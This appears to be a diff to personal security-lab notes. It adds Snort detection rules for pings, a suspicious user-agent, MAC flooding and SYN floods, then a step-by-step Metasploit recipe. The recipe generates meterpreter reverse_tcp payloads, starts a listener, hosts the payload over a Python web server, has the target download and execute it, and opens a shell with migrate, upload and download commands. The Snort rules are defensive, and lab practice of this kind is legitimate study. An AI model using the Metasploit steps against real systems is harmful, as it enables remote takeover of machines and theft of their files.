@@ -19,4 +19,67 @@ sudo snort -A console -q -c snort.conf
 Test
 sudo snort -T -i ens37 -c snort.conf 
 
+Rules 
+
+alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)   
+alert tcp any any -> $HOME_NET 80 (msg:"Suspicious User-Agent"; content:"evilbot"; http_header; sid:1000002; rev:1;)
+alert ip any any -> any any (msg:"Potential MAC Flooding - High Packet Rate"; detection_filter: track by_src, count 1000, seconds 10; sid:1000010; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"SYN Flood Attack Detected (Single Source)"; flags:S; detection_filter:track by_src, count 10, seconds 5; sid:1000020; rev:1;)  
+
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Nagios :-
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Metasploit :-
+
+msfdb reinit
+msfconsole
+use payload/linux/x64/meterpreter/reverse_tcp   |  use payload/windows/x64/meterpreter/reverse_tcp
+set LHOST 
+set LPORT
+generate -f elf -o ~/home/payload/abc.elf       |  generate -f exe/raw -o ~/home/payload/abc.exe/raw
+back 
+
+Activate Listener :-
+
+use multi/handler
+set LHOST 
+set LPORT
+set PAYLOAD linux/x64/meterpreter/reverse_tcp   |  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+
+Webhost Payload from the Directory :-
+cd ~/home/payload/
+python3 -m http.server --bind <ip-kali> <port_any_but_not_LPORT>
+
+CLient :- 
+Access Website DOwnload Payload 
+http://<ip-kali>:<port_any_but_not_LPORT>
+chmod +x abc.elf
+./abc.elf
+
+After This go to Kali :-
+meterpreter > shell 
+              script /dev/null -qc bash
+
+Meterpreter Command :
+
+help 'OR' ?: Display the help menu
+migrate <PID> 
+ps
+upload <local> <remote>
+download <remote> <local>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NMAP :-
+
+
+
+
+
+
